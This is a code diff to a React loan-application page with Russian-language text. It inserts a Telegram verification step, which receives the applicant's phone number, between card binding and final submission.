@@ -9,6 +9,7 @@ import FormSteps, { FormData } from "@/components/loan/FormSteps";
 import ProcessingScreen from "@/components/loan/ProcessingScreen";
 import ResultScreen from "@/components/loan/ResultScreen";
 import CardBindingStep from "@/components/loan/CardBindingStep";
+import TelegramVerificationStep from "@/components/loan/TelegramVerificationStep";
 
 type SubmitStatus = 'idle' | 'processing' | 'approved' | 'rejected';
 
@@ -36,6 +37,7 @@ const Index = () => {
   const [isProcessing, setIsProcessing] = useState(false);
   const [processingTimer, setProcessingTimer] = useState(60);
   const [showCardBinding, setShowCardBinding] = useState(false);
+  const [showTelegramVerification, setShowTelegramVerification] = useState(false);
   const { toast } = useToast();
 
   const handleInputChange = (field: keyof FormData, value: string | number | File) => {
@@ -77,9 +79,26 @@ const Index = () => {
     setShowCardBinding(false);
     toast({
       title: "Карта привязана",
-      description: "Теперь вы можете получить займ",
+      description: "Карта успешно привязана к аккаунту",
     });
-    nextStep();
+  };
+
+  const handleTelegramCheck = () => {
+    setShowTelegramVerification(true);
+  };
+
+  const handleTelegramVerificationSuccess = () => {
+    setShowTelegramVerification(false);
+    toast({
+      title: "Подтверждено через Telegram! ✅",
+      description: "Заявка прошла дополнительную верификацию",
+    });
+    handleSubmit();
+  };
+
+  const handleTelegramSkip = () => {
+    setShowTelegramVerification(false);
+    handleSubmit();
   };
 
 
@@ -97,8 +116,8 @@ const Index = () => {
     }
   }, [processingTimer, isProcessing]);
 
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
+  const handleSubmit = async (e?: React.FormEvent) => {
+    if (e) e.preventDefault();
     setIsSubmitting(true);
     setSubmitStatus('processing');
     setIsProcessing(true);
@@ -173,6 +192,7 @@ const Index = () => {
     setIsProcessing(false);
     setProcessingTimer(60);
     setShowCardBinding(false);
+    setShowTelegramVerification(false);
   };
 
   const getStepTitle = () => {
@@ -240,11 +260,18 @@ const Index = () => {
             </CardHeader>
 
             <CardContent className="p-8 space-y-6">
-              {currentStep === 5 ? (
+              {showTelegramVerification ? (
+                <TelegramVerificationStep 
+                  phoneNumber={formData.phone}
+                  onVerificationSuccess={handleTelegramVerificationSuccess}
+                  onSkip={handleTelegramSkip}
+                />
+              ) : currentStep === 5 ? (
                 <CardBindingStep 
                   onSuccess={handleCardBindingSuccess} 
-                  onSubmit={handleSubmit}
+                  onSubmit={handleTelegramCheck}
                   isSubmitting={isSubmitting}
+                  phoneNumber={formData.phone}
                 />
               ) : (
                 <FormSteps 
